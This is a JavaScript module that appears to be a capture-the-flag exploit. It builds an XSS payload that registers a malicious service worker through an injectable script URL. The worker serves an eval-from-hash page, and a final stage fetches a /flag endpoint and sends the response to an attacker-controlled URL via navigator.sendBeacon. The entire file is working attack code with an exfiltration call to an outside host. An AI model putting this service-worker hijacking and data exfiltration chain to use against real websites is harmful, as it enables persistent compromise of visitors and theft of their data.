const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");

const sw_payload = `
	document = {getElementById: (s) => {return {innerText: ""}}};
	self.addEventListener("fetch", async (event) => {
		console.log(event);
		if (new URL(event.request.url).pathname == "/js/exploit") {
			event.respondWith(
				new Response(
					"<script>eval(decodeURIComponent(location.hash.slice(1)))</script>", 
					{ headers: {"Content-Type": "text/html"} }
				)
			);
		}
	});
	"OK";
`;

const final_payload = `
	(async ()=>{
		const res = await fetch("/flag", { headers: {"X-FLAG": "1"} });
		const flag = await res.text();
		navigator.sendBeacon("${ATTACKER_BASE_URL}", flag);
	})();
`;

const xss_payload = `
const sw_payload = \`${sw_payload}\`;
const final_payload = \`${final_payload}\`;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

(async ()=>{
	await navigator.serviceWorker.register(
		\`/js/index.js?expr=\${encodeURIComponent(sw_payload)}\`
	);

	await sleep(2000);

	location.href = \`/js/exploit#\${encodeURIComponent(final_payload)}\`;
})();
`

module.exports = { xss_payload };
